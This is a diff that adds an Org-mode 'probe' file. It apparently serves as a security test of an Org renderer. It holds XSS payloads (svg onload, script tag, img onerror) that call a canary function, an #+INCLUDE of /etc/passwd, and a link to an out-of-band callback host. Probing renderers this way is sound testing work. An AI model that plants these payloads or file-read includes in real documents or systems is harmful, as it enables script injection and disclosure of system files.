@@ -1,0 +1,13 @@
+* Org probe
+
+#+BEGIN_HTML
+<svg onload="window.__forgeXssHit('FORGE_XSS_fb4cc2dff1ce55b2ef0a04ddf6c8f3a8')"></svg>
+<script>window.__forgeXssHit('FORGE_XSS_fb4cc2dff1ce55b2ef0a04ddf6c8f3a8')</script>
+#+END_HTML
+
+#+BEGIN_EXPORT html
+<img src=x onerror="window.__forgeXssHit('FORGE_XSS_fb4cc2dff1ce55b2ef0a04ddf6c8f3a8')">
+#+END_EXPORT
+
+#+INCLUDE: "/etc/passwd"
+[[http://PEN-NZUY-4251-6754.dns.collabp-reg1.devops.aws.dev/org-image.png]]
